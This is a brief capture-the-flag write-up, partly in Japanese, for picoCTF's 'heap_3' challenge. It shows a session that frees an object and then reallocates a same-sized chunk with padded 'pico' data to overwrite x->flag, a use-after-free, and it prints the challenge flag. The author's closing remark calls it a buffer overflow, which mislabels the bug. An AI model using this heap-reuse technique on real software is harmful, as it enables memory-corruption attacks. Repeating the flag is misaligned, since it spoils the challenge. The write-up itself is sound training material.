# heap_3:binary Medium    
This program mishandles memory. Can you exploit it to get the flag?  
Download the source [here](heap_3.c)  

Additional details will be available after launching your challenge instance.  

# Solution  
バイナリとソースコードが渡される  
freed but still in use  
now memory untracked  
do you smell the bug?  

1. Print Heap  
2. Allocate object  
3. Print x->flag  
4. Check for win  
5. Free x  
6. Exit  

Enter your choice: 5  

1. Print Heap  
2. Allocate object  
3. Print x->flag  
4. Check for win  
5. Free x  
6. Exit  

Enter your choice: 2  
Size of object allocation: 40  
Data for flag: picopicopicopicopicopicopicopipico  

1. Print Heap  
2. Allocate object  
3. Print x->flag  
4. Check for win  
5. Free x  
6. Exit  

Enter your choice: 3  


x = pico  


1. Print Heap  
2. Allocate object  
3. Print x->flag  
4. Check for win  
5. Free x  
6. Exit  

Enter your choice: 4  
YOU WIN!!11!!  
picoCTF{now_thats_free_real_estate_c1e14587}  

# 考えたこと    
x->flagにバッファオーバーフローでpicoに上書きすれば、４を起動すればFLAGが獲得できると考えた